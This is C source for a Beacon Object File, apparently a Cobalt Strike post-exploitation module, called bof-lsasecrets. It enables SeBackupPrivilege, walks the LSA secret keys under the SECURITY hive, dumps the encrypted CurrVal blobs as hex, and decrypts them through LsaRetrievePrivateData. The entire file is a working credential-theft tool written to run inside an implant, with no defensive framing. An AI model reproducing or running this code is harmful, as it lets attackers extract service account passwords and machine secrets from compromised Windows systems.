/*
 * bof-lsasecrets
 *
 * Enumerate the LSA secret slots under HKLM\SECURITY\Policy\Secrets using
 * SeBackupPrivilege and print the encrypted CurrVal blobs.  When the current
 * context is SYSTEM (or otherwise allowed) the secret is also decrypted with
 * LsaRetrievePrivateData and shown as text/hex.
 *
 * The SECURITY hive is normally readable only by SYSTEM; enabling
 * SeBackupPrivilege is what makes this work from an elevated administrator.
 * Nothing is written and LSASS is never opened.
 */
#include "beacon.h"
#include "bofdefs.h"
#include "helpers.h"

static void enable_privilege(const char *name)
{
    HANDLE tok = NULL;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(),
                                   TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &tok))
        return;
    bof_memzero(&tp, sizeof(tp));
    if (ADVAPI32$LookupPrivilegeValueA(NULL, name, &luid)) {
        tp.PrivilegeCount = 1;
        tp.Privileges[0].Luid = luid;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        ADVAPI32$AdjustTokenPrivileges(tok, FALSE, &tp, sizeof(tp), NULL, NULL);
    }
    KERNEL32$CloseHandle(tok);
}

static void dump_hex(const unsigned char *p, unsigned int n, int prefix)
{
    static const char *h = "0123456789abcdef";
    char line[160];
    unsigned int i, o = 0;
    unsigned int shown = n > 96 ? 96 : n;

    for (i = 0; i < shown; i++) {
        line[o++] = h[(p[i] >> 4) & 0xf];
        line[o++] = h[p[i] & 0xf];
        if ((i & 15) == 15 || i + 1 == shown) {
            line[o] = 0;
            BeaconPrintf(CALLBACK_OUTPUT, "%*s%s%s\n", prefix, "", line,
                         (i + 1 < n) ? " ..." : "");
            o = 0;
        }
    }
}

static void print_lsa_text(const LSA_UNICODE_STRING *s)
{
    if (!s || !s->Buffer || !s->Length) {
        BeaconPrintf(CALLBACK_OUTPUT, "      [lsa] <empty>\n");
        return;
    }
    {
        char tmp[2048];
        wchar_t w[1024];
        unsigned int chars = s->Length / sizeof(WCHAR);
        unsigned int i;
        if (chars > 1023) chars = 1023;
        for (i = 0; i < chars; i++) w[i] = s->Buffer[i];
        w[chars] = 0;
        if (bof_w2a(w, tmp, sizeof(tmp)) <= 0) {
            BeaconPrintf(CALLBACK_OUTPUT, "      [lsa] <wide, %u bytes>\n",
                         (unsigned)s->Length);
            return;
        }
        /* Only claim text when the result is printable. */
        for (i = 0; tmp[i]; i++) {
            if (tmp[i] < 0x20 && tmp[i] != '\t') {
                BeaconPrintf(CALLBACK_OUTPUT, "      [lsa] <binary, %u bytes>\n",
                             (unsigned)s->Length);
                dump_hex((const unsigned char *)s->Buffer, s->Length, 10);
                return;
            }
        }
        BeaconPrintf(CALLBACK_OUTPUT, "      [lsa] %s\n", tmp);
    }
}

void go(char *args, int alen)
{
    HKEY secrets = NULL;
    DWORD idx = 0, sublen;
    char name[512];
    LSA_OBJECT_ATTRIBUTES oa;
    LSA_HANDLE pol = NULL;
    int have_policy = 0;
    int count = 0;

    (void)args; (void)alen;
    enable_privilege("SeBackupPrivilege");
    enable_privilege("SeRestorePrivilege");

    if (ADVAPI32$RegOpenKeyExA(HKEY_LOCAL_MACHINE,
            "SECURITY\\Policy\\Secrets", 0,
            KEY_READ | KEY_WOW64_64KEY, &secrets) != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR,
                     "RegOpenKeyEx(SECURITY\\Policy\\Secrets) failed: %lu "
                     "(admin + SeBackupPrivilege?)\n",
                     (unsigned long)KERNEL32$GetLastError());
        return;
    }

    bof_memzero(&oa, sizeof(oa));
    if (ADVAPI32$LsaOpenPolicy(NULL, &oa, POLICY_GET_PRIVATE_INFORMATION,
                               &pol) == 0)
        have_policy = 1;

    BeaconPrintf(CALLBACK_OUTPUT, "================ LSA secrets ================\n");

    for (;;) {
        HKEY sk = NULL;
        DWORD type = 0, size = 0;
        unsigned char val[8192];
        sublen = sizeof(name);
        if (ADVAPI32$RegEnumKeyExA(secrets, idx, name, &sublen, NULL, NULL,
                                   NULL, NULL) != ERROR_SUCCESS)
            break;
        idx++;
        name[sublen] = 0;

        BeaconPrintf(CALLBACK_OUTPUT, "\n[%s]\n", name);

        if (ADVAPI32$RegOpenKeyExA(secrets, name, 0,
                KEY_READ | KEY_WOW64_64KEY, &sk) == ERROR_SUCCESS) {
            size = sizeof(val);
            if (ADVAPI32$RegQueryValueExA(sk, "CurrVal", NULL, &type,
                                          val, &size) == ERROR_SUCCESS) {
                BeaconPrintf(CALLBACK_OUTPUT,
                             "      CurrVal : %u bytes (%s)\n",
                             (unsigned)size, bof_regtype(type));
                dump_hex(val, size > sizeof(val) ? sizeof(val) : size, 8);
            } else {
                BeaconPrintf(CALLBACK_OUTPUT, "      CurrVal : <unreadable>\n");
            }
            size = sizeof(val);
            if (ADVAPI32$RegQueryValueExA(sk, "OldVal", NULL, &type,
                                          val, &size) == ERROR_SUCCESS)
                BeaconPrintf(CALLBACK_OUTPUT, "      OldVal  : %u bytes\n",
                             (unsigned)size);
            ADVAPI32$RegCloseKey(sk);
        } else {
            BeaconPrintf(CALLBACK_OUTPUT, "      <key open failed>\n");
        }

        if (have_policy) {
            LSA_UNICODE_STRING key;
            LSA_UNICODE_STRING *data = NULL;
            NTSTATUS st;
            int n = bof_strlen(name), i;

            key.Buffer = (PWSTR)KERNEL32$LocalAlloc(0,
                            ((unsigned int)n + 1) * sizeof(WCHAR));
            if (key.Buffer) {
                for (i = 0; i < n; i++) key.Buffer[i] = (WCHAR)name[i];
                key.Buffer[n] = 0;
                key.Length = (USHORT)(n * sizeof(WCHAR));
                key.MaximumLength = (USHORT)((n + 1) * sizeof(WCHAR));
                st = ADVAPI32$LsaRetrievePrivateData(pol, &key, &data);
                if (st == 0 && data) {
                    print_lsa_text(data);
                    ADVAPI32$LsaFreeMemory(data);
                } else {
                    BeaconPrintf(CALLBACK_OUTPUT,
                                 "      [lsa] unavailable (0x%08lx)\n",
                                 (unsigned long)st);
                }
                KERNEL32$LocalFree(key.Buffer);
            }
        }
        count++;
    }

    if (have_policy) ADVAPI32$LsaClose(pol);
    ADVAPI32$RegCloseKey(secrets);
    BeaconPrintf(CALLBACK_OUTPUT, "\n[*] %d secret slot(s)\n", count);
}
